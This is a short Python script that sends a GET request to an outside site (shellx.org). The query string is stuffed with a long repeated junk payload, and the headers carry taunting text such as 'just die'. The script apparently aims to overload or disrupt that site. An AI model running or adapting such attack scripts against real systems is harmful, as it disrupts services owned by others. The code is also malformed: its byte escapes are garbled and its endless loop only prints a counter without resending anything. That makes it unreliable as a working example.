import requests

hello = """\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\xFF\0x11\
xFF\0x11\xFF\0x11\xFF""" * 6

url = "http://shellx.org/hide/add.php?link=" + hello
h = {
    'cache-control': "no-cache",
    'name': "\\\\\\\\\\\\\\\\\\\\\\\\ no one /////////////////////////",
	'user-agent': '\\\\\\\\\\\\\\\\\\\\\ just die ///////////////////////////'
    }

okey = requests.get(url, headers=h)
i = 0
while True:
    if okey.status_code !=200:
        print('waka waka! seems down humm ?.')
    elif okey.status_code ==200 :
        i+=1
        print("cool : " + str(i))
